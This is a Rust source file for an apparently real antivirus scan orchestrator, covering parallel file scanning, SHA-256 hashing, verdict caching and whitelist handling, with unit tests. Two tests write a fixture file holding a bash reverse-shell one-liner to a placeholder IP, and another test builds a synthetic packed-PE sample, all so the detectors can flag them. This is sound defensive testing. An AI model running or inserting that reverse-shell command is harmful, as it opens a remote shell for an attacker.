//! The scan orchestrator — walks a target, checks the whitelist first, then
//! runs every enabled [`Engine`] over each file **in parallel** using rayon's
//! work-stealing pool.
//!
//! Rework features:
//! * Single-read architecture: uses `memmap2` (with streaming fallback). The same
//!   bytes are hashed and scanned without second reads.
//! * Verdict cache: keyed by (dev, ino, size, mtime) to skip unchanged files.
//! * Rayon thread pool: honors `config.threads`.
//! * Known-bad hash override: trusted paths containing known malware are still caught.
//! * Correct stats tracking for `scanned`, `skipped`, `threats`, `errors`.

use crate::engine::{Engine, FileContext};
use aegis_core::{Config, Detection, Event, EventBus, FileVerdict, ScanStats, Whitelist};
use rayon::prelude::*;
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::fs::File;
use std::ops::Deref;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, RwLock};
use std::time::Instant;

/// In-memory buffer or memory-mapped view of a file.
enum FileBuffer {
    Mmap(memmap2::Mmap),
    Vec(Vec<u8>),
}

impl Deref for FileBuffer {
    type Target = [u8];
    fn deref(&self) -> &[u8] {
        match self {
            FileBuffer::Mmap(m) => m,
            FileBuffer::Vec(v) => v,
        }
    }
}

/// Cache key for unchanged file verdicts.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
struct CacheKey {
    ino_or_id: u64,
    size: u64,
    mtime_ns: i64,
}

/// Owns the engine set + policy and executes scans.
pub struct Scanner {
    config: Config,
    whitelist: Whitelist,
    engines: Arc<Vec<Box<dyn Engine>>>,
    bus: EventBus,
    cache: Arc<RwLock<HashMap<CacheKey, FileVerdict>>>,
}

impl Scanner {
    pub fn new(
        config: Config,
        whitelist: Whitelist,
        engines: Vec<Box<dyn Engine>>,
        bus: EventBus,
    ) -> Self {
        Self::new_shared(config, whitelist, Arc::new(engines), bus)
    }

    /// Construct a scanner over a pre-built, shareable engine set. The daemon
    /// builds the (expensive-to-compile) YARA engine once and hands the same
    /// `Arc` to every scan, avoiding recompilation per request.
    pub fn new_shared(
        config: Config,
        whitelist: Whitelist,
        engines: Arc<Vec<Box<dyn Engine>>>,
        bus: EventBus,
    ) -> Self {
        Self {
            config,
            whitelist,
            engines,
            bus,
            cache: Arc::new(RwLock::new(HashMap::new())),
        }
    }

    pub fn engines(&self) -> &[Box<dyn Engine>] {
        self.engines.as_slice()
    }

    /// Enumerate the regular files under `target` honouring exclusions,
    /// hidden-file and symlink policy.
    pub fn enumerate(&self, target: &Path) -> Vec<PathBuf> {
        if target.is_file() {
            return vec![target.to_path_buf()];
        }
        let mut out = Vec::new();
        let walker = walkdir::WalkDir::new(target)
            .follow_links(self.config.follow_symlinks)
            .into_iter()
            .filter_entry(|e| {
                let p = e.path();
                if self.config.is_excluded(p) {
                    return false;
                }
                if !self.config.scan_hidden {
                    if let Some(name) = p.file_name().and_then(|n| n.to_str()) {
                        if name.starts_with('.') && p != target {
                            return false;
                        }
                    }
                }
                true
            });
        for entry in walker.filter_map(|e| e.ok()) {
            if entry.file_type().is_file() {
                out.push(entry.into_path());
            }
        }
        out
    }

    fn get_cache_key(&self, path: &Path, meta: &std::fs::Metadata) -> CacheKey {
        #[cfg(unix)]
        {
            let _ = path;
            use std::os::unix::fs::MetadataExt;
            CacheKey {
                ino_or_id: meta.ino(),
                size: meta.len(),
                mtime_ns: meta.mtime_nsec(),
            }
        }
        #[cfg(windows)]
        {
            use std::hash::{Hash, Hasher};
            use std::os::windows::fs::MetadataExt;
            let mut h = std::collections::hash_map::DefaultHasher::new();
            path.hash(&mut h);
            let id = h.finish() ^ meta.creation_time();
            CacheKey {
                ino_or_id: id,
                size: meta.file_size(),
                mtime_ns: meta.last_write_time() as i64,
            }
        }
        #[cfg(not(any(unix, windows)))]
        {
            let _ = path;
            CacheKey {
                ino_or_id: 0,
                size: meta.len(),
                mtime_ns: 0,
            }
        }
    }

    /// Scan a single file (mmap single-read -> hash -> engines -> cache).
    pub fn scan_file(&self, path: &Path) -> FileVerdict {
        // 1. Metadata check.
        let meta = match std::fs::symlink_metadata(path) {
            Ok(m) => m,
            Err(e) => {
                let mut v = FileVerdict::clean(path.to_path_buf());
                v.error = Some(e.to_string());
                return v;
            }
        };
        if !meta.is_file() {
            let mut v = FileVerdict::clean(path.to_path_buf());
            v.error = Some("not a regular file".into());
            return v;
        }

        let size = meta.len();
        let mut verdict = FileVerdict::clean(path.to_path_buf());
        verdict.size = size;

        if size == 0 {
            return verdict;
        }

        if size > self.config.max_file_size {
            verdict.error = Some("skipped (exceeds max file size)".into());
            return verdict;
        }

        // 2. Verdict Cache lookup.
        let cache_key = self.get_cache_key(path, &meta);
        if let Ok(cache) = self.cache.read() {
            if let Some(cached) = cache.get(&cache_key) {
                return cached.clone();
            }
        }

        // 3. Read once via memmap2 (with fallback to buffer).
        let buffer = match File::open(path) {
            Ok(file) => {
                // Try mmap
                match unsafe { memmap2::Mmap::map(&file) } {
                    Ok(m) => FileBuffer::Mmap(m),
                    Err(_) => match std::fs::read(path) {
                        Ok(b) => FileBuffer::Vec(b),
                        Err(e) => {
                            verdict.error = Some(e.to_string());
                            return verdict;
                        }
                    },
                }
            }
            Err(e) => {
                verdict.error = Some(e.to_string());
                return verdict;
            }
        };

        // 4. Compute SHA-256 in a single pass from the in-memory buffer.
        let mut hasher = Sha256::new();
        hasher.update(&buffer[..]);
        verdict.sha256 = hex::encode(hasher.finalize());

        // 5. Hash engine check: known-bad hash wins over trusted path.
        let is_path_whitelisted = self.whitelist.is_path_whitelisted(path);
        let is_hash_whitelisted = self.whitelist.is_hash_whitelisted(&verdict.sha256);

        let ctx = FileContext {
            path,
            data: &buffer[..],
            size,
            sha256: &verdict.sha256,
        };

        let mut detections: Vec<Detection> = Vec::new();
        for engine in self.engines.iter() {
            detections.extend(engine.scan(&ctx));
        }

        // 5b. Android APK / DEX detection engine delegation
        let path_str = path.to_string_lossy().to_ascii_lowercase();
        if path_str.ends_with(".apk") || path_str.ends_with(".dex") {
            if let Ok(apk_rep) = aegis_android::scan_android_file(path) {
                if apk_rep.overall_risk_score >= 35 || !apk_rep.threats.is_empty() {
                    let sev = if apk_rep.overall_risk_score >= 70 {
                        aegis_core::Severity::Critical
                    } else {
                        aegis_core::Severity::Medium
                    };
                    let threat_name = apk_rep.threats.first().cloned().unwrap_or_else(|| "Android.Malware".to_string());
                    detections.push(Detection::new(
                        "Android",
                        format!("Android.{}", threat_name),
                        sev,
                        aegis_core::ThreatClass::Heuristic,
                        format!("Android APK/DEX threat: {} (risk score: {})", apk_rep.threats.join(", "), apk_rep.overall_risk_score),
                    ));
                }
            }
        }

        // If it was path whitelisted, but matches a known-bad hash signature, flag it!
        let has_hash_signature = detections.iter().any(|d| d.engine == "Hash" && d.severity >= aegis_core::Severity::High);

        if is_hash_whitelisted || (is_path_whitelisted && !has_hash_signature) {
            verdict.whitelisted = true;
            verdict.detections.clear();
        } else {
            verdict.detections = detections;
        }

        // 6. Cache clean and stable verdicts.
        if verdict.error.is_none() {
            if let Ok(mut cache) = self.cache.write() {
                cache.insert(cache_key, verdict.clone());
            }
        }

        verdict
    }

    /// Scan a target directory/file in parallel honoring configured thread pool.
    pub fn scan(&self, target: &Path) -> (ScanStats, Vec<FileVerdict>) {
        let start = Instant::now();
        let files = self.enumerate(target);
        let total = files.len() as u64;
        self.bus.publish(&Event::ScanStarted {
            target: target.to_path_buf(),
            total,
        });

        let index = Arc::new(AtomicU64::new(0));
        let scanned = Arc::new(AtomicU64::new(0));
        let skipped = Arc::new(AtomicU64::new(0));
        let errors = Arc::new(AtomicU64::new(0));
        let bytes = Arc::new(AtomicU64::new(0));

        let scan_work = || {
            files
                .par_iter()
                .map(|path| {
                    let i = index.fetch_add(1, Ordering::Relaxed) + 1;
                    self.bus.publish(&Event::FileScanned {
                        path: path.clone(),
                        index: i,
                        total,
                    });
                    let v = self.scan_file(path);
                    if v.error.is_some() {
                        if v.error.as_deref().unwrap_or("").starts_with("skipped") {
                            skipped.fetch_add(1, Ordering::Relaxed);
                        } else {
                            errors.fetch_add(1, Ordering::Relaxed);
                        }
                    } else if v.whitelisted {
                        skipped.fetch_add(1, Ordering::Relaxed);
                        scanned.fetch_add(1, Ordering::Relaxed);
                    } else {
                        scanned.fetch_add(1, Ordering::Relaxed);
                        bytes.fetch_add(v.size, Ordering::Relaxed);
                    }
                    if v.is_threat() {
                        self.bus.publish(&Event::ThreatFound(Box::new(v.clone())));
                    }
                    v
                })
                .collect::<Vec<FileVerdict>>()
        };

        let verdicts = if self.config.threads > 0 {
            if let Ok(pool) = rayon::ThreadPoolBuilder::new()
                .num_threads(self.config.threads)
                .build()
            {
                pool.install(scan_work)
            } else {
                scan_work()
            }
        } else {
            scan_work()
        };

        let threats = verdicts.iter().filter(|v| v.is_threat()).count() as u64;
        let stats = ScanStats {
            total_files: total,
            scanned: scanned.load(Ordering::Relaxed),
            skipped: skipped.load(Ordering::Relaxed),
            threats,
            errors: errors.load(Ordering::Relaxed),
            bytes_scanned: bytes.load(Ordering::Relaxed),
            duration_ms: start.elapsed().as_millis() as u64,
        };
        self.bus.publish(&Event::ScanFinished(stats.clone()));
        (stats, verdicts)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::heuristic_engine::HeuristicEngine;
    use crate::ml_engine::MlEngine;

    #[test]
    fn scans_directory_and_flags_threat() {
        let dir = std::env::temp_dir().join(format!("aegis-orch-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("clean.txt"), b"nothing to see here").unwrap();
        std::fs::write(
            dir.join("evil.sh"),
            b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/9001 0>&1\n",
        )
        .unwrap();

        let engines: Vec<Box<dyn Engine>> = vec![Box::new(HeuristicEngine::default())];
        let scanner = Scanner::new(
            Config::default(),
            Whitelist::default(),
            engines,
            EventBus::new(),
        );
        let (stats, verdicts) = scanner.scan(&dir);
        assert_eq!(stats.total_files, 2);
        assert_eq!(stats.threats, 1);
        assert!(verdicts
            .iter()
            .any(|v| v.is_threat() && v.path.ends_with("evil.sh")));

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn whitelisted_dir_is_skipped() {
        let dir = std::env::temp_dir().join(format!("aegis-wl-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("evil.sh"),
            b"#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/9001 0>&1\n",
        )
        .unwrap();

        let mut wl = Whitelist::default();
        wl.add_path(&dir, "trusted", true, 0);
        let engines: Vec<Box<dyn Engine>> = vec![Box::new(HeuristicEngine::default())];
        let scanner = Scanner::new(Config::default(), wl, engines, EventBus::new());
        let (stats, _) = scanner.scan(&dir);
        assert_eq!(stats.threats, 0);

        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn scans_directory_with_ml_engine_and_flags_malicious_pe() {
        let dir = std::env::temp_dir().join(format!("aegis-ml-orch-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();

        // Synthetic malicious PE with UPX sections and high entropy
        let mut mal_pe = Vec::with_capacity(1024);
        mal_pe.extend_from_slice(b"MZ");
        mal_pe.resize(0x3C, 0);
        mal_pe.extend_from_slice(&0x80u32.to_le_bytes());
        mal_pe.resize(0x80, 0);
        mal_pe.extend_from_slice(b"PE\0\0");
        mal_pe.extend_from_slice(&0x014cu16.to_le_bytes()); // i386
        mal_pe.extend_from_slice(&2u16.to_le_bytes());      // 2 sections
        mal_pe.extend_from_slice(&0u32.to_le_bytes());
        mal_pe.extend_from_slice(&0u32.to_le_bytes());
        mal_pe.extend_from_slice(&0u32.to_le_bytes());
        mal_pe.extend_from_slice(&224u16.to_le_bytes());
        mal_pe.extend_from_slice(&0x0102u16.to_le_bytes());
        // Optional header
        mal_pe.extend_from_slice(&0x010Bu16.to_le_bytes());
        mal_pe.extend_from_slice(&[1, 0]);
        mal_pe.extend_from_slice(&0x200u32.to_le_bytes());
        mal_pe.extend_from_slice(&0x200u32.to_le_bytes());
        mal_pe.extend_from_slice(&0u32.to_le_bytes());
        mal_pe.extend_from_slice(&0x1000u32.to_le_bytes()); // Entrypoint
        mal_pe.extend_from_slice(&0x1000u32.to_le_bytes());
        mal_pe.extend_from_slice(&0x2000u32.to_le_bytes());
        mal_pe.extend_from_slice(&0x00400000u32.to_le_bytes());
        mal_pe.extend_from_slice(&0x1000u32.to_le_bytes());
        mal_pe.extend_from_slice(&0x200u32.to_le_bytes());
        mal_pe.extend_from_slice(&[4, 0, 0, 0]); // OS version
        mal_pe.extend_from_slice(&[0, 0, 0, 0]); // Image version
        mal_pe.extend_from_slice(&[4, 0, 0, 0]); // Subsystem version
        mal_pe.extend_from_slice(&0u32.to_le_bytes());
        mal_pe.extend_from_slice(&0x3000u32.to_le_bytes());
        mal_pe.extend_from_slice(&0x200u32.to_le_bytes());
        mal_pe.extend_from_slice(&0u32.to_le_bytes());
        mal_pe.extend_from_slice(&3u16.to_le_bytes());
        mal_pe.extend_from_slice(&0u16.to_le_bytes());
        mal_pe.extend_from_slice(&0x100000u32.to_le_bytes());
        mal_pe.extend_from_slice(&0x1000u32.to_le_bytes());
        mal_pe.extend_from_slice(&0x100000u32.to_le_bytes());
        mal_pe.extend_from_slice(&0x1000u32.to_le_bytes());
        mal_pe.extend_from_slice(&0u32.to_le_bytes());
        mal_pe.extend_from_slice(&16u32.to_le_bytes());
        mal_pe.resize(mal_pe.len() + 128, 0); // 16 Data directories
        // Section 1: UPX0 with W+X (RWX)
        mal_pe.extend_from_slice(b"UPX0\0\0\0\0");
        mal_pe.extend_from_slice(&0x1000u32.to_le_bytes());
        mal_pe.extend_from_slice(&0x1000u32.to_le_bytes());
        mal_pe.extend_from_slice(&0x200u32.to_le_bytes());
        mal_pe.extend_from_slice(&0x200u32.to_le_bytes());
        mal_pe.extend_from_slice(&[0; 12]);
        mal_pe.extend_from_slice(&0xE000_0020u32.to_le_bytes()); // RWX
        // Section 2: UPX1
        mal_pe.extend_from_slice(b"UPX1\0\0\0\0");
        mal_pe.extend_from_slice(&0x1000u32.to_le_bytes());
        mal_pe.extend_from_slice(&0x2000u32.to_le_bytes());
        mal_pe.extend_from_slice(&0x200u32.to_le_bytes());
        mal_pe.extend_from_slice(&0x400u32.to_le_bytes());
        mal_pe.extend_from_slice(&[0; 12]);
        mal_pe.extend_from_slice(&0x4000_0040u32.to_le_bytes());
        mal_pe.resize(0x200, 0);
        let high_entropy: Vec<u8> = (0..512).map(|i| ((i * 199 + 37) % 256) as u8).collect();
        mal_pe.extend_from_slice(&high_entropy);
        mal_pe.resize(0x600, 0);

        std::fs::write(dir.join("packed_trojan.exe"), &mal_pe).unwrap();
        std::fs::write(dir.join("normal.txt"), b"just regular notes here").unwrap();

        let engines: Vec<Box<dyn Engine>> = vec![
            Box::new(HeuristicEngine::default()),
            Box::new(MlEngine::default()),
        ];
        let scanner = Scanner::new(
            Config::default(),
            Whitelist::default(),
            engines,
            EventBus::new(),
        );

        let (stats, verdicts) = scanner.scan(&dir);
        assert_eq!(stats.total_files, 2);
        assert!(stats.threats >= 1);

        let trojan_verdict = verdicts
            .iter()
            .find(|v| v.path.ends_with("packed_trojan.exe"))
            .expect("packed_trojan.exe verdict not found");
        assert!(trojan_verdict.is_threat());
        assert!(trojan_verdict
            .detections
            .iter()
            .any(|d| d.engine == "MachineLearning"));

        std::fs::remove_dir_all(&dir).ok();
    }
}
